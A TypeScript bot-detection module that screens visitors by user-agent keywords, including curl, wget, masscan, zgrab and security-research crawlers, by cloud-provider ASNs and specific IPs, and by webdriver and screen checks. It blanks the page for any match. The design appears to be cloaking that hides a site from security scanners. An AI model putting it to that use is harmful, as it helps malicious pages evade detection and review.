import type { BotCheckResult } from '@/types';

const blockedKeywords = new Set([
    'bot',
    'crawler',
    'spider',
    'puppeteer',
    'selenium',
    'http',
    'client',
    'curl',
    'wget',
    'python',
    'java',
    'ruby',
    'go',
    'scrapy',
    'lighthouse',
    'censysinspect',
    'krebsonsecurity',
    'ivre-masscan',
    'ahrefs',
    'semrush',
    'sistrix',
    'mailchimp',
    'mailgun',
    'larbin',
    'libwww',
    'spinn3r',
    'zgrab',
    'masscan',
    'yandex',
    'baidu',
    'sogou',
    'tweetmeme',
    'misting',
    'botpoke'
]);

const blockedASNs = new Set([
    15169, 32934, 396982, 8075, 16509, 16510, 14618, 31898, 45102, 55960, 198605, 201814, 24940, 51396, 14061, 20473,
    63949, 16276, 135377, 52925, 17895, 52468, 36947, 55720, 397373, 208312, 37100, 214961, 401115, 210644, 6939, 209,
    147049, 63023
]);

const blockedIPs = new Set(['95.214.55.43', '154.213.184.3', '38.68.134.126']);

const redirectBot = () => {
    document.body.innerHTML = '';
    window.location.href = 'about:blank';
};

const checkUserAgent = (): BotCheckResult => {
    const userAgent = navigator.userAgent.toLowerCase();
    for (const keyword of blockedKeywords) {
        if (userAgent.includes(keyword)) {
            redirectBot();
            return { isBot: true, reason: `ua keyword: ${keyword}` };
        }
    }
    return { isBot: false };
};

const checkGeoIP = (): BotCheckResult => {
    try {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) return { isBot: false };

        const data = JSON.parse(ipInfo) as { country_code?: string; asn?: number; ip?: string };

        if (blockedASNs.has(Number(data.asn))) {
            redirectBot();
            return { isBot: true, reason: `blocked ASN: ${data.asn}` };
        }

        if (data.ip && blockedIPs.has(data.ip)) {
            redirectBot();
            return { isBot: true, reason: `blocked IP: ${data.ip}` };
        }

        return { isBot: false };
    } catch {
        return { isBot: false };
    }
};

const checkWebDriver = (): BotCheckResult => {
    if (navigator.webdriver === true) {
        redirectBot();
        return { isBot: true, reason: 'navigator.webdriver = true' };
    }

    const phantomKeys = ['__nightmare', '_phantom', 'callPhantom', 'Buffer', 'emit', 'spawn'];
    for (const key of phantomKeys) {
        if (key in window) {
            redirectBot();
            return { isBot: true, reason: `window.${key} detected` };
        }
    }

    const seleniumProps = [
        '__selenium_unwrapped',
        '__webdriver_evaluate',
        '__driver_evaluate',
        '__webdriver_script_function',
        '__webdriver_script_func',
        '__webdriver_script_fn',
        '__fxdriver_evaluate',
        '__driver_unwrapped',
        '__webdriver_unwrapped',
        '__selenium_evaluate',
        '__fxdriver_unwrapped'
    ];

    for (const prop of seleniumProps) {
        if (prop in window || prop in document) {
            redirectBot();
            return { isBot: true, reason: `selenium: ${prop}` };
        }
    }

    return { isBot: false };
};

const checkNavigator = (): BotCheckResult => {
    if (navigator.webdriver === true) {
        document.body.innerHTML = '';
        return { isBot: true, reason: 'navigator.webdriver' };
    }

    const cores = navigator.hardwareConcurrency;
    if (cores && (cores > 128 || cores < 1)) {
        redirectBot();
        return { isBot: true, reason: `hardwareConcurrency: ${cores}` };
    }

    return { isBot: false };
};

const checkScreen = (): BotCheckResult => {
    const { width, height } = screen;

    if (width === 2000 && height === 2000) {
        redirectBot();
        return { isBot: true, reason: '2000x2000 screen' };
    }

    if (width > 4000 || height > 4000 || width < 200 || height < 200) {
        redirectBot();
        return { isBot: true, reason: `screen ${width}x${height}` };
    }

    return { isBot: false };
};

const detectBot = async (): Promise<BotCheckResult> => {
    const checks = [checkUserAgent, checkWebDriver, checkNavigator, checkScreen, checkGeoIP];

    for (const check of checks) {
        const result = check();
        if (result.isBot) return result;
    }

    return { isBot: false };
};

export default detectBot;
